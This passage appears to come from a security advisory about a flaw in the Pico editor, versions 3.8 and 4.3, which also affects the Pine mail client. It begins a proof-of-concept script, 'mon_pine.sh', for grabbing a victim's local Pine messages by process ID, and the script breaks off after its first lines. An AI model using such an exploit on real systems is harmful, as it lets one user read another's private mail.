Depending on the user's privilege level , this could have a range of negative impacts on the host's security and operation. ， Versions 3.8 and 4.3 of Pico have been confirmed vulnerable. Other versions are likely affected as well. ， Note that , because the popular mail client Pine uses Pico as its editor , Pine is also vulnerable to this issue. ， -mon_pine.sh start- ，  #  ! /bin/sh ，  # Grab local pine messages ，  # Usage : ./mon_pine.sh <pid of pine process> ，  # victim pine must use following settings ，  # mat @ hacksware.com ，  #  [ x ] enable-alternate-editor-cmd ，  #  [ x ] enable-alternate-editor-implicitly ，  # editor = /usr/bin/vi ， PID= $ 1 ， PICO_FILE=`",
